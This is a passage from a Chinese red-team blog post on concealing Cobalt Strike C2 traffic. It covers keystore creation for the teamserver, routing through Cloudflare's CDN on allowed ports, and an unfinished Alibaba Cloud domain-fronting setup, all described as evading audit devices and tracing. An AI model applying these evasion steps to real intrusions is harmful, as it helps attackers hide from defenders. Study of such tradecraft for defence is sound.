<p>1.将下载的SSL证书在CS中重新生成一下store。注意密码和名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -export -in full_chain.pem -inkey private.key -out wwwshawecn.p12 -name www.shawe.cn -passout pass:whoami</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass whoami -destkeypass whoami -destkeystore shawe.store -srckeystore wwwshawecn.p12 -srcstoretype PKCS12 -srcstorepass whoami -alias www.shawe.cn</span><br></pre></td></tr></table></figure>
<p>2.修改teamserver最后一行的配置使其默认启动加载新生成的store，要改的是密码和文件名</p>
<p>然后就没有了，直接使用修改后的teamserver运行修改的C2配置。</p>
<p>但是我的域名是没备案的，而且走的CDN，都是挂在cloudflare上解析的，所以会出现一些坑点。当时一度被这个问题难到，后来发现8443端口可以用而其他端口不能用，想到可能是cloudflare的设置，于是翻了一下cloudflare的帮助文件终于找到解决办法。</p>
<p><img src="/images/C2-4.jpg" alt="C2-4"></p>
<p>由上所见，CS的Listen端口和一句话的端口必须是HTTPS下面的那几个。443被神秘力量拦了，我们只能用5个。</p>
<p>curl一下，有流量就行了。</p>
<p><img src="/images/C2-5.png" alt="C2-5"></p>
<p>接下来Scripted Web Delivery选个8443就行了。上线就不演示了。</p>
<p>由下图可以看到，CS的通信是全TLSv1.2加密的。流量设备抓到的是一些加密包，是完全没有办法看到真实内容的，可以很好的避免流量审计设备监测到的CS通信。IP层上只看到一个CDN转换后的IP地址，应用层全加密，只能通过payload中的域名去溯源。</p>
<p><img src="/images/C2-6.png" alt="C2-6"></p>
<h1 id="老手-利用前置域隐藏"><a href="#老手-利用前置域隐藏" class="headerlink" title="老手-利用前置域隐藏"></a>老手-利用前置域隐藏</h1><p>老大说要学这个，我一想，确实得学。学习使我快乐。</p>
<p>前置域原理就不记录了，网上一大堆，这里只记录实操和坑点，只测试过阿里云的，其他云平台还没测过。</p>
<p>前置域可以解决以上方式的所有缺点，现在看来前置域方式几乎没有缺陷，堪称最完美的隐匿方案。溯源溯不到，封也封不了，而且封不完，最主要是这一切都是合法的流量，也不会告警。</p>
<p>1.首先我们得需要一个合法的域名，就是备案过的，不被神秘力量拦解析的。</p>
<p>这一步就不说了。</p>
<p>2.然后需要在阿里云买CDN服务。</p>
<p>阿里云的CDN分CDN和全站CDN，我开通的全站CDN，端口选443，稍后需配置SSL证书。</p>
<p><img src="/images/C2-7.png" alt="C2-7"></p>
<p>加速域名可以是子域名(xx.xx.xx)，也可以是泛解析域名(*.xx.xx)，但不能是主域名(xx.x)。</p>
<p>填完之后会给你一个cname值，意思就是你的子域名通过这个cname域名来加速。</p>
<p><img src="/images/C2-8.png" alt="C2-8"></p>
<p>cname域名是阿里云的，可以ping一下发现这个域名是有CDN的。</p>
<p><img src="/images/C2-9.png" alt="C2-9"></p>
<p>阿里的意思就是“我已经给你了开了CDN，你拿着这个CNAME域名用吧。</p>
<p>”那我怎么用呢？</p>
<p>这个时候需要在自己域名解析下面添加一条txt记录，意思就是将这个子域名关联到阿里的CNAME域名上，自己的子域名就像是这个CNAME域名一样了。但是只能是特定端口。</p>
<p>3.最后，需要配置SSL证书。</p>
<p>证书名称：子域名</p>
<p>证书公钥：full_chain.pem</p>
<p>证书私钥：private.key</p>
<p>可以选择不同的方式配置。</p>
<p><img src="/images/C2-10.png" alt="C2-10"></p>
<p>4.当以上都配置完成后，还需要配置我们的CS，以便能够和这个域名关联起来。</p>
<p>待补充。。</p>
<h1 id="精通"><a href="#精通" class="headerlink" title="精通-??"></a>精通-??</h1><h1 id="大师"><a href="#大师" class="headerlink" title="大师-??"></a>大师-??</h1><h1 id="我还没学-重定向隐藏"><a href="#我还没学-重定向隐藏" class="headerlink" title="我还没学-重定向隐藏"></a>我还没学-重定向隐藏</h1>]]></content>
      <categories>
        <category>技巧</category>
      </categories>
      <tags>
        <tag>C2</tag>
      </tags>
  </entry>
</search>
